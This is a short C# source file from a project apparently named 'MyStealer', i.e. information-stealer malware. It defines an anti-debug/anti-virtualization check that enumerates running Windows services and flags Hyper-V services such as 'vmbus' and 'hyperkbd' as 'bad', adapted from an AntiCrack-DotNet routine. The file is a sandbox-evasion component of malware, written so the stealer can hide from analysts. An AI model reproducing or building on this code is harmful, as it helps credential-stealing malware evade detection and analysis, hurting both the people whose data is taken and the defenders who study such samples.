﻿using System.ServiceProcess;

namespace MyStealer.AntiDebug.Check
{
    /// <summary>
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiVirtualization.cs#L113
    /// </summary>
    internal class Services : CheckBase
    {
        public override string Name => "Services";

        private readonly string[] serviceNames = new string[]
        {
            "vmbus",
            "VMBusHID",
            "hyperkbd"
        };

        public override bool CheckPassive()
        {
            foreach (var service in ServiceController.GetServices())
            {
                if (service.Status == ServiceControllerStatus.Stopped)
                    continue;

                foreach (var name in serviceNames)
                {
                    if (service.ServiceName.Contains(name))
                    {
                        Logger.Information("Bad service {name} is running.", name);
                        return true;
                    }
                }
            }

            return false;
        }
    }
}
